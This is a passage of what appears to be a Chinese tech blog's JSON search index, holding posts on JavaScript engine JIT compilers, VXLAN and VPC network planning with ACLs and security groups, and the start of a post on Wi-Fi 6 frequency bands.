Node-ChakraCore 两个项目的微软 JavaScript 引擎，与<code>SpiderMonkey</code>非常类似，也有类似两个优化编译器的设置。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/edge.jpg\" class=\"\">\n\n<ul>\n<li>解释器将字节码提交给 <code>SimpleJIT</code>，生成部分优化的机器码</li>\n<li>结合解释器的运行分析数据，<code>FullJIT</code>生成深度优化的机器吗</li>\n</ul>\n<h2 id=\"四、基本结论\"><a href=\"#四、基本结论\" class=\"headerlink\" title=\"四、基本结论\"></a>四、基本结论</h2><h3 id=\"1-黄金组合-字节码解释器-JIT-编译器\"><a href=\"#1-黄金组合-字节码解释器-JIT-编译器\" class=\"headerlink\" title=\"1. 黄金组合 &#x3D; 字节码解释器 + JIT 编译器\"></a>1. 黄金组合 &#x3D; 字节码解释器 + JIT 编译器</h3><p>解释器技术和编译器技术的历史悠久，各有所长，通过多年的发展正在逐步走向融合，已经成为现代主流浏览器的普遍共识。<br>以<code>Ignition</code> + <code>TurboFan</code>为例，</p>\n<ul>\n<li>首先，解释器完成字节码编译并快速启动应用，同时收集执行信息并记录热点代码</li>\n<li>后台的JIT编译器把字节码编译成高效机器码，并缓存到磁盘文件</li>\n<li>后续启动时，只执行优化后的高效机器码，而不再解释执行字节码</li>\n</ul>\n<h3 id=\"2-为什么需要多个不同的编译器？\"><a href=\"#2-为什么需要多个不同的编译器？\" class=\"headerlink\" title=\"2. 为什么需要多个不同的编译器？\"></a>2. 为什么需要多个不同的编译器？</h3><p>这完全是一些折衷的取舍。一方面，解释器可以快速生成字节码，但字节码的执行速度（不是启动速度）通常不够快。另一方面，优化编译器处理需要更长的时间，但最终会生成更高效的机器码。到底是快速获取可执行的代码（解释器），还是花费更多时间但最终以最佳性能运行代码（优化编译器），这其中包含一个平衡点。<br>因此，现代JS引擎通常选择同时提供几个不同特性的优化编译器，以更高的复杂性为代价来对这些折衷点进行更细粒度的控制。</p>\n<h3 id=\"3-影响编译器性能的关键技术\"><a href=\"#3-影响编译器性能的关键技术\" class=\"headerlink\" title=\"3. 影响编译器性能的关键技术\"></a>3. 影响编译器性能的关键技术</h3><ul>\n<li>词法分析 Scanner 、语法分析 Parser 和 抽象语法树 AST</li>\n<li>字节码设计，基于栈或者基于寄存器的虚拟机</li>\n<li>内联缓存（Inline Cache）</li>\n<li>内存管理和垃圾回收策略（Garbage Collection）</li>\n<li>多线程管理和消息队列</li>\n</ul>\n<p>本文暂不展开，先点个题备着，未来还将继续研究！</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方资料\"><a href=\"#官方资料\" class=\"headerlink\" title=\"官方资料\"></a>官方资料</h3><ul>\n<li><a href=\"https://v8.dev/blog/10-years\">V8引擎的十年之路 - Google官方</a></li>\n<li><a href=\"https://github.com/v8/v8\">V8引擎的Github主页</a></li>\n<li><a href=\"Google%E5%85%B3%E4%BA%8Eignition%E7%9A%84%E4%BB%8B%E7%BB%8D.pptx\">PPT下载：Iginition: 快速启动的V8解释器 - Ross McIlroy</a></li>\n</ul>\n<h3 id=\"技术研究\"><a href=\"#技术研究\" class=\"headerlink\" title=\"技术研究\"></a>技术研究</h3><ul>\n<li><a href=\"https://juejin.cn/post/6844904152745639949\">V8引擎详解系列 - 阿里巴巴暮桥</a></li>\n<li><a href=\"https://juejin.cn/post/7018468848886579214\">Google V8引擎浅析 - 字节跳动ELab团队</a></li>\n<li><a href=\"https://juejin.cn/post/6984302939095449608\">深入理解JavaScript的V8引擎</a></li>\n<li><a href=\"https://juejin.cn/post/6844903622333956103\">深入了解 JavaScript 引擎精华</a></li>\n<li><a href=\"https://juejin.cn/post/6890187786045882375\">初识 JavaScriptCore JIT</a></li>\n</ul>\n<h3 id=\"视频资料\"><a href=\"#视频资料\" class=\"headerlink\" title=\"视频资料\"></a>视频资料</h3><ul>\n<li><a href=\"https://www.youtube.com/watch?v=5nmpokoRaZI\">Mathias 和 Benedikt 在 JSConf EU 2018 的视频</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=mtVBAcy7AKA\">Michael Saboff 关于 JavaScriptCore 的视频</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1FJ411E7Sf/\">V8 Ignition 解释器的字节码（Bytecodes）- B站课程</a></li>\n</ul>\n"},{"title":"VPC网络规划的关键技术分析","url":"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<h2 id=\"一、vxLan技术的应用\"><a href=\"#一、vxLan技术的应用\" class=\"headerlink\" title=\"一、vxLan技术的应用\"></a>一、vxLan技术的应用</h2><h3 id=\"经典网络的问题\"><a href=\"#经典网络的问题\" class=\"headerlink\" title=\"经典网络的问题\"></a>经典网络的问题</h3><p>传统IDC一般采用基于Vlan的经典网络，其特点是：</p>\n<ul>\n<li>首先进行安全规划划分为若干个安全域，一个维度是用户归属的管理权限，例如每个法人主体各自一个安全域；另一个维度是安全级别，例如互联网接口域、DMZ域、核心域等</li>\n<li>为每个安全域设立硬件防火墙，确保网络资源的物理隔离</li>\n<li>在每个安全域内部，所有用户共享公共网络资源池，用户之间不做逻辑隔离，或者基于<code>VLan</code>进行逻辑隔离。用户的内网IP由系统统一分配，相同的内网IP无法分配给不同用户。</li>\n</ul>\n<p>但是，对于大规模的公有云来说，如果采用VLAN，每个用户一个二层网络，那最多只能带4096多个用户，公有云许多用户还是只有1-2个云主机那种，那必然不能满足公有云的需求，所以在早期的经典网络模式下，不得不让多个用户挤在一个二层网络里面，仅仅要确保IP地址不重合，就是一件非常困难的事情，更无法实现细粒度的网络隔离和安全控制。</p>\n<h3 id=\"VxLan的协议格式\"><a href=\"#VxLan的协议格式\" class=\"headerlink\" title=\"VxLan的协议格式\"></a>VxLan的协议格式</h3><p>虚拟可扩展局域网（VXLAN）是一项网络虚拟化覆盖技术。通过在 IP-UDP 隧穿封装中使用 MAC，它可在共享第 3 层底层基础设施网络上，提供第 2 层扩展。在覆盖网络中获得第 2 层扩展的目的是，消除物理服务器堆叠现象，或突破地理位置界线，并且在数据中心内部或数据中心间，灵活地部署工作负载。</p>\n<p>最初的 IETF VXLAN 标准（RFC7348）定义了一个基于组播的洪泛和学习 VXLAN，无控制平面。它依靠数据驱动的洪泛和学习行为，来发现远程 VTEP 对等设备和学习远端主机。覆盖广播，即未知单播和组播（BUM）流量被封装到组播 VXLAN 分组中，通过底层组播转发，传送到远程 VTEP 交换机。这种部署中，洪泛会给解决方案可扩展性带来挑战。此外，该解决方案的另一问题是，需要在底层网络中启用组播功能，而部分机构不希望在数据中心和&#x2F;或广域网中启用组播。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/baowen.png\" class=\"\">\n\n<ul>\n<li>VXLAN数据包封装在UDP中，使用物理网络的IP和MAC地址为头部进行封装，网络通信而言只是个参数。</li>\n<li>VXLAN标准灰色部分有VNID即VNI，24bits支持千万级别。</li>\n<li>通过UDP延伸二层网络，用户可以自定制虚拟化网络，不需要关注虚拟机的MAC地址。</li>\n</ul>\n<p>虽然VXLAN协议通过UDP NVO3技术解决了网络扩展和迁移的问题，但是也会有一些缺点:</p>\n<ul>\n<li>因为采用的UDP延伸二层网络，它执行的是租户的执行隔离而流量完全没有加密，最直接的方案是通过IPsec进行加密，因为流量加密对于公有云来说很重要！！！</li>\n<li>VXLAN协议添加了很多字节固定开销。</li>\n<li>多播和组播基于VXLAN协议下要特别考虑网络洪泛BUM影响问题和网络设计，多播在Linux不可用时可以考虑BGP EVPN的方式。</li>\n<li>Linux VXLAN不支持IGMP,可以通过FDB实现方式来解决。</li>\n<li>由于VXLAN是一个通用的网络协议标准，各厂商对VXLAN实现的协议标准的保留字段会有不一致的地方，当使用华为和华三的网络设备业务层面需要抽象另外一层来实现解耦。</li>\n</ul>\n<h3 id=\"VxLan的网络模型\"><a href=\"#VxLan的网络模型\" class=\"headerlink\" title=\"VxLan的网络模型\"></a>VxLan的网络模型</h3><img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vxlan.png\" class=\"\">\n\n<ul>\n<li><p><code>Overlay和Underlay</code>网络：物理网络作为Underlay网络，在其上构建出 虚拟的二层或三层网络，即Overlay网络。OverLay是基于隧道实现的，流量需要跑在UnderLay之上。</p>\n</li>\n<li><p><code>NVE</code>:实现网络虚拟化的网络实体，报文经过NVE封装转换后，NVE间就可基于三层网络建立二层虚拟化网络。</p>\n</li>\n<li><p><code>VTEP隧道终点</code>：封装在NVE实体中，主要用于VXLAN报文的封装和解装，一个VTEP地址对应一个VXLAN隧道,VXLAN报文中的源IP地址为本节点的VTEP地址，目的ip地址为对端VTEP地址。</p>\n</li>\n<li><p><code>VNI</code>：网络标识，主要用于区分VXLAN段，租户和VNI映射。</p>\n</li>\n</ul>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><ol>\n<li><p>Overlay网络的优点简单说就两句话：一是在三层网络中利用封装技术提高二层网络扩展性的同时规避了传统二层网络的种种弊端；二是通过引入VNID的概念，满足了云计算多租户vlan不够，以及租户间网络隔离的问题。</p>\n</li>\n<li><p>Overlay技术的诞生实际就是为了解决云计算大环境下传统网络的种种问题，从它的技术构想到落地方案都是按照云计算的思路来的，所以对于一个规模较小且相对稳定的网络环境中是没有必要用overlay技术的，用了反而把网络搞复杂了。</p>\n</li>\n<li><p>Overlay的所有技术路线中，VXLAN的运用最广泛，得到了最多的主流网络厂商的支持，未来很长一段时间里很可能成为overlay技术的代名词；</p>\n</li>\n</ol>\n<h2 id=\"二、网络ACL-VS-安全组\"><a href=\"#二、网络ACL-VS-安全组\" class=\"headerlink\" title=\"二、网络ACL VS 安全组\"></a>二、网络ACL VS 安全组</h2><p>防火墙主要是做南北向的访问控制，作用范围是VPC及其子网；安全组主要是做东西向的访问控制，作用范围是虚拟机网卡。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vpc-infra.png\" class=\"\">\n\n<blockquote>\n<p>从流量的角度来看，VPC访问路径依次是：<br>外部网络 –&gt; VPC路由器 –&gt; 所在子网的ACL过滤–&gt; 虚拟机网卡的安全组过滤 –&gt; 业务应用</p>\n</blockquote>\n<h3 id=\"ACL的工作方式\"><a href=\"#ACL的工作方式\" class=\"headerlink\" title=\"ACL的工作方式\"></a>ACL的工作方式</h3><ul>\n<li>防火墙作用在VPC路由器上，属于集中式的VPC边缘设备，为整个VPC提供访问控制。防火墙的配置是动态生效的，即时的配置会马上作用到VPC路由器接口；</li>\n<li>数据包进入防火墙时，根据规则集的规则优先级进行逐条匹配，如果匹配上了，则执行规则的行为；如果没有匹配上，则执行规则集的默认行为。</li>\n<li>防火墙可以针对不同报文状态来进行过滤，如new、established、invalid、related；也可以针对常见的协议，如TCP、UDP、VRRP、ICMP等。同时，如果协议是TCP或者ICMP，防火墙提供了更加细粒度的过滤规则，能够针对ICMP的类型、TCP的flag进行匹配，进一步细化策略，满足更多的使用场景。</li>\n</ul>\n<h3 id=\"安全组的工作方式\"><a href=\"#安全组的工作方式\" class=\"headerlink\" title=\"安全组的工作方式\"></a>安全组的工作方式</h3><p>Linux网络虚拟化支持linux bridge以及openvswitch（简称OVS），OpenStack Neutron ml2驱动二者都支持，目前大多数使用的是OVS。</p>\n<p>不过早期的iptables不支持OVS bridge以及port，因此为了实现安全组，虚拟机的tap设备并不是直接连接到OVS bridge上，而是中间加了一个Linux bridge，通过veth pair连接Linux bridge以及OVS bridege，这样就可以在Linux bridge上添加iptables规则实现安全组功能了。</p>\n<ul>\n<li>安全组作用于虚拟机的虚拟网卡上，给虚拟机提供三层网络的访问控制，支持入方向、出方向的过滤；</li>\n<li>安全组是一个分布式的访问控制，可以对TCP&#x2F;UDP&#x2F;ICMP等协议进行有效过滤；也可以直接匹配所有协议；可以根据数据包的源IP进行过滤。</li>\n</ul>\n<h3 id=\"小结2\"><a href=\"#小结2\" class=\"headerlink\" title=\"小结2\"></a>小结2</h3><p>从安全的角度来看，在离威胁源更近的地方进行防护是更好的方式。<br>一般来说，南北向交给防火墙来做，安全组作为防火墙的补充，是云主机安全的最后防线。<br>安全组和防火墙是相辅相成的，两者有机结合，才能够更好的做云主机的安全防护。</p>\n<img src=\"/2021/06/27/VPC%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/vs.png\" class=\"\">\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.sdnlab.com/20510.html\">VPC的技术演进历史</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1004614\">经典网络还是VPC，开发者作何选择？</a></li>\n<li><a href=\"https://www.cisco.com/c/dam/assets/global/CN/products/switches/pdf/Design_Guide_for_VXLAN_with_EVPN_Control_Plane.pdf\">VxLan网络设计指南-Cisco</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1647354\">深入浅出云计算VPC网络之VXLAN</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/86734727\">安全组和云防火墙的区别</a></li>\n<li><a href=\"https://www.infoq.cn/article/oagppdcg*a1zqkzgbbcb\">深入浅出 OpenStack 安全组实现原理</a></li>\n</ul>\n"},{"title":"VPC（虚拟私有云）的网络规划","url":"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>虚拟私有云（Virtual Private Cloud，以下简称VPC，有的厂商也称为<code>私有网络</code>），是一个<strong>用户自定义的</strong>、<strong>逻辑隔离</strong>的虚拟网络环境，以提升用户云上资源的安全性，并满足不同的应用场景需求。</p>\n<p>您可以在VPC中定义安全组、VPN、IP地址段、带宽等网络特性。用户可以通过VPC方便地管理、配置内部网络，进行安全、快捷的网络变更。同时，用户可以自定义安全组内与组间弹性云服务器的访问规则，加强弹性云服务器的安全保护。</p>\n<p>从业务连续性的角度，大型业务系统必须支持多中心部署，例如“两地三中心”，“四地八中心”等，为此VPC的网络规划需要基于 Region 和 Zone 。</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/zone.png\" class=\"\">\n\n<h3 id=\"Region-地域\"><a href=\"#Region-地域\" class=\"headerlink\" title=\"Region - 地域\"></a>Region - 地域</h3><p>地域（Region）是指物理的数据中心的地理区域。<br>不同Region之间的距离一般大于30公里（预防地震、战争等严重灾害），但是一般不超过1000公里（过高的网络传输延迟可能影响数据同步）。</p>\n<blockquote>\n<p>不同地域之间的VPC完全物理隔离，不同地域之间的VPC默认不能通过内网通信，只能通过公网进行通信。</p>\n</blockquote>\n<h3 id=\"Zone-可用区\"><a href=\"#Zone-可用区\" class=\"headerlink\" title=\"Zone - 可用区\"></a>Zone - 可用区</h3><p>可用区（Zone）是指同一地域内电力和网络互相独立的物理数据中心。其目标是能够保证可用区间故障相互隔离（大型灾害或者大型电力故障除外），不出现故障扩散，使得用户的业务持续在线服务。</p>\n<p>实际上，Zone就是同一个Region（城）的多个数据中心，一般距离小于30公里，具备独立的物理机房、电力供应和网络传输，而且之间有高速数据专线。</p>\n<h2 id=\"二、VPC的核心组件\"><a href=\"#二、VPC的核心组件\" class=\"headerlink\" title=\"二、VPC的核心组件\"></a>二、VPC的核心组件</h2><p>VPC有几个核心组成部分：私有网络网段、子网、路由表、接入控制列表、安全组。<br>VPC的基本框架如下图：</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-infra.png\" class=\"\">\n\n<h3 id=\"CIDR-私有网络网段\"><a href=\"#CIDR-私有网络网段\" class=\"headerlink\" title=\"CIDR - 私有网络网段\"></a>CIDR - 私有网络网段</h3><p>用户在创建私有网络时，需要用 <code>CIDR</code>（无类别域间路由） 作为私有网络指定 IP 地址组。</p>\n<blockquote>\n<p>私有网络<code>CIDR</code>支持使用如下私有网段中的任意一个：<br>A类：10.0.0.0&#x2F;8，一个A类网络<br>B类：172.16.0.0&#x2F;12，即172.16.0.1-172.31.255.254共16个B类网络<br>C类：192.168.0.0&#x2F;16，即192.168.0.1-192.168.255.254共256个C类网络</p>\n</blockquote>\n<h3 id=\"Subnet-子网\"><a href=\"#Subnet-子网\" class=\"headerlink\" title=\"Subnet - 子网\"></a>Subnet - 子网</h3><p>一个VPC由至少一个子网组成，VPC中的所有云资源（如云服务器、云数据库等）都必须部署在子网内，子网的 CIDR 必须在VPC的 CIDR 内。</p>\n<blockquote>\n<p>单一VPC不能跨Region（如广州IDC）部署，但是可以划分为多个子网，并部署在不同Zone（如广州一区）<br>同一VPC下，不同Subnet之间<strong>默认内网互通</strong><br>不同VPC之间，无论是否在同一地域，均<strong>默认内网隔离</strong>，但可通过创建<strong>对等连接</strong>实现互联互通</p>\n</blockquote>\n<h3 id=\"Router-路由表\"><a href=\"#Router-路由表\" class=\"headerlink\" title=\"Router - 路由表\"></a>Router - 路由表</h3><p>路由表由一系列路由规则组成，用于控制虚拟私有云内子网的出流量走向。</p>\n<blockquote>\n<p>用户创建私有网络时，系统会自动为其生成一个默认路由表，以保证同一个私有网络下的所有子网互通<br>每个子网都必须关联一个路由表，但一个路由表可以关联多个子网</p>\n</blockquote>\n<h3 id=\"ACL（Access-Control-List）-接入控制列表\"><a href=\"#ACL（Access-Control-List）-接入控制列表\" class=\"headerlink\" title=\"ACL（Access Control List） - 接入控制列表\"></a>ACL（Access Control List） - 接入控制列表</h3><p>网络 ACL 是一个子网级别的、无状态的包过滤虚拟防火墙，用于控制进出子网的数据流，可以精确到协议和端口粒度。</p>\n<p>实际上，ACL的本质就是用于描述一个IP数据包、以太网数据帧若干特征的集合。然后根据这些集合去匹配网络中的流量，根据策略来“允许”或者“禁止”。</p>\n<h3 id=\"Secruity-Group-安全组\"><a href=\"#Secruity-Group-安全组\" class=\"headerlink\" title=\"Secruity Group - 安全组\"></a>Secruity Group - 安全组</h3><p>安全组是一种有状态的包过滤虚拟防火墙，用于控制实例级别的出入流量，为同一个VPC内具有相同安全保护需求并相互信任的云服务器提供访问策略。</p>\n<p>系统为每个用户默认创建一个安全组，默认安全组的规则是在出方向上的数据报文全部放行，入方向访问受限，安全组内的云服务器无需添加规则即可互相访问。</p>\n<h2 id=\"三、VPC的增强组件\"><a href=\"#三、VPC的增强组件\" class=\"headerlink\" title=\"三、VPC的增强组件\"></a>三、VPC的增强组件</h2><p>除了VPC路由器、子网、安全组等核心功能，通常VPC还提供一些附加技术组件，以方便租户的系统部署。</p>\n<img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-desktop.png\" class=\"\">\n\n<h3 id=\"EIP（Elastic-IP-Address）-弹性公网IP\"><a href=\"#EIP（Elastic-IP-Address）-弹性公网IP\" class=\"headerlink\" title=\"EIP（Elastic IP Address） - 弹性公网IP\"></a>EIP（Elastic IP Address） - 弹性公网IP</h3><p>弹性公网IP是可以独立购买和持有的公网IP地址资源，实现IP与服务实例分离，可以动态解绑和绑定可绑定到专有网络VPC内的ECS实例、私网SLB实例和NAT网关上。</p>\n<blockquote>\n<p>EIP实则是一种NAT IP，位于阿里云公网网关上，通过NAT映射的方式绑定到VPC网络的ECS&#x2F;SLB&#x2F;NAT等实例的私网网卡上。<br>对于某个VPC，可以在不同Zone的子网上部署多个实例共享EIP，从而实现公网服务的主用&#x2F;备用切换。</p>\n</blockquote>\n<h3 id=\"CLB（Cloud-Load-Balancer，CLB）-负载均衡\"><a href=\"#CLB（Cloud-Load-Balancer，CLB）-负载均衡\" class=\"headerlink\" title=\"CLB（Cloud Load Balancer，CLB）- 负载均衡\"></a>CLB（Cloud Load Balancer，CLB）- 负载均衡</h3><p>CLB提供安全快捷的流量分发服务，访问流量经由 CLB 可以自动分配到云中的多台云服务器上，扩展系统的服务能力并消除单点故障。</p>\n<h3 id=\"对等连接\"><a href=\"#对等连接\" class=\"headerlink\" title=\"对等连接\"></a>对等连接</h3><p>对等连接是指两个VPC之间的网络连接。您可以使用私有IP地址在两个VPC之间进行通信，就像两个VPC在同一个网络中一样。<br>同一区域内，您可以在自己的VPC之间创建对等连接，也可以在自己的VPC与其他帐户的VPC之间创建对等连接。<br>不同区域间的VPC之间不能创建对等连接。</p>\n<h2 id=\"四、几个典型VPC网络的规划分析\"><a href=\"#四、几个典型VPC网络的规划分析\" class=\"headerlink\" title=\"四、几个典型VPC网络的规划分析\"></a>四、几个典型VPC网络的规划分析</h2><h3 id=\"1、AWS的私有网络实例\"><a href=\"#1、AWS的私有网络实例\" class=\"headerlink\" title=\"1、AWS的私有网络实例\"></a>1、AWS的私有网络实例</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-4.png\" class=\"\">\n\n<p>本VPC的CIDR网络地址块为<code>10.0</code>.0.0&#x2F;16，包含了3个子网：</p>\n<h4 id=\"Subnet1-公网互联出口\"><a href=\"#Subnet1-公网互联出口\" class=\"headerlink\" title=\"Subnet1 - 公网互联出口\"></a>Subnet1 - 公网互联出口</h4><ul>\n<li>子网地址块为<code>10.0.0</code>.0&#x2F;24，位于Zone A</li>\n<li>包含2个实例，分别是 1A 实例（10.0.0.5）和 1B 实例(10.0.0.6）</li>\n<li>1A实例绑定了一个IPV4公网地址（198.51.100.1），1B实例绑定了一个IPV6公网地址</li>\n</ul>\n<h4 id=\"Subnet2-内部应用\"><a href=\"#Subnet2-内部应用\" class=\"headerlink\" title=\"Subnet2 - 内部应用\"></a>Subnet2 - 内部应用</h4><ul>\n<li>子网地址块为<code>10.0.1</code>.0&#x2F;24，位于Zone B</li>\n<li>包含1个实例，2A 实例（10.0.1.5）</li>\n<li>这个子网及其内部实例位于VPC内部，不能直接访问公网，也不能被公网直接访问</li>\n</ul>\n<h4 id=\"Subnet3-系统维护出口\"><a href=\"#Subnet3-系统维护出口\" class=\"headerlink\" title=\"Subnet3 - 系统维护出口\"></a>Subnet3 - 系统维护出口</h4><ul>\n<li>子网地址块为<code>10.0.2</code>.0&#x2F;24，位于Zone C</li>\n<li>包含1个实例，3A 实例（10.0.2.5）</li>\n<li>通过 VPN 连接到企业内部网络，用于开发、维护</li>\n</ul>\n<h3 id=\"2、一个典型的VPC租户\"><a href=\"#2、一个典型的VPC租户\" class=\"headerlink\" title=\"2、一个典型的VPC租户\"></a>2、一个典型的VPC租户</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-2.png\" class=\"\">\n\n<ul>\n<li>设置独立的互联网边界防火墙，并拥有负载均衡设备CLB，弹性地址EIP。</li>\n<li>内部子网通过ACL实现南北流量控制，安全组负责实现东西流量控制</li>\n</ul>\n<h4 id=\"核心VPC\"><a href=\"#核心VPC\" class=\"headerlink\" title=\"核心VPC\"></a>核心VPC</h4><ul>\n<li>可以认为是一个中台系统，是一个独立的租户</li>\n<li>内部分为2个子网，分别承载数据库系统、后台逻辑</li>\n</ul>\n<h4 id=\"互联网VPC\"><a href=\"#互联网VPC\" class=\"headerlink\" title=\"互联网VPC\"></a>互联网VPC</h4><ul>\n<li>可以认为是某个前台系统，通过VPC边界防火墙与核心VPC互联</li>\n<li>内部分为2个子网，分别承载数据库系统、后台逻辑、前端应用</li>\n</ul>\n<h3 id=\"3、一个大规模的VPC租户\"><a href=\"#3、一个大规模的VPC租户\" class=\"headerlink\" title=\"3、一个大规模的VPC租户\"></a>3、一个大规模的VPC租户</h3><img src=\"/2021/06/26/VPC%EF%BC%88%E8%99%9A%E6%8B%9F%E7%A7%81%E6%9C%89%E4%BA%91%EF%BC%89%E7%9A%84%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92/vpc-3.png\" class=\"\">\n\n<ul>\n<li>2个Mysql数据库的子网，采用主用&#x2F;备用方式，子网位于不同Zone，有利于提高业务可用性</li>\n<li>2个APP应用的子网，也是位于不同Zone，但是采用双活方案，通过 ELB 实现负载均衡</li>\n<li>独立设置NAT子网，负责保护公网出口</li>\n<li>Bastion是一个堡垒机子网，为开发、维护人员提供安全接入，一般通过浏览器接入云平台门户，不需要公共IP地址，不需要代理，也不需要专门的客户端软件</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://support.huaweicloud.com/eu-west-0-usermanual-vpc/vpc_0001.html\">华为云的网络规划介绍</a></li>\n<li><a href=\"http://www.coding-daddy.com/other/aws-deploy.html#_1-vpc%E5%AE%9A%E4%B9%89\">AWS VPC网络部署参考</a></li>\n<li><a href=\"https://blog.csdn.net/qq_24550639/article/details/109202811\">Azure Bastion 堡垒机的介绍</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/35130978?ivk_sa=1024320u\">UCloud云平台的VPC部署案例</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之一：频率规划","url":"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/","content":"<p>Wi-Fi联盟（英语：Wi-Fi Alliance，缩写WFA），是一个商业联盟，拥有Wi-Fi的商标。它负责Wi-Fi认证，与商标授权的工作，也负责制定Wi-Fi的标准，总部位于美国德州首府Austin。</p>\n<p>Wi-Fi背后的技术标准，是由美国的电气电子工程师协会（IEEE）制定的802.11系列协议。在最初的很多年里，Wi-Fi虽然一代代向前发展，但世界上并没有Wi-Fi几代这样的说法，直接就用802.11后面加几个字母这样的协议编号，对普通用户非常不友好。</p>\n<p>2018年，Wi-Fi联盟决定把下一代技术标准802.11ax用更为简单易懂的Wi-Fi 6来宣传，上一代的802.11ac和802.11n就被追溯成了Wi-Fi 5和Wi-Fi 4，至于Wi-Fi 1&#x2F;2&#x2F;3，并没有得到大规模的推广应用，技术也已淘汰，就没啥好讨论的了。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%A2%91%E7%8E%87%E8%A7%84%E5%88%92/wifi.png\" class=\"\">\n\n<p>本文主要讨论Wi-Fi的工作频段，也就是2.4GHz和5GHz，这两个频段均属于ISM频段（Industrial Scientific Medical Band）,详细分析请参见附录一。<br>根据工信部的规定，国内无线接入系统（Wi-Fi）频率的使用范围是：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">系统名称</th>\n<th align=\"center\">频率范围</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">2400MHz 频段无线接入系统</td>\n<td align=\"center\">2400-2483.5MHz</td>\n</tr>\n<tr>\n<td align=\"center\">5100MHz 频段无线接入系统</td>\n<td align=\"center\">5150-5350MHz（仅限于室内使用），其中 5250-5350MHz 应具备DFS功能</td>\n</tr>\n<tr>\n<td align=\"center\">5800MHz 频段无线接入系统</td>\n<td align=\"center\">5725-5850MHz</td>\n</tr>\n</tbody></table>\n<h2 id=\"一、2-4GHz频段\"><a href=\"#一、2-4GHz频段\" class=\"headerlink\" 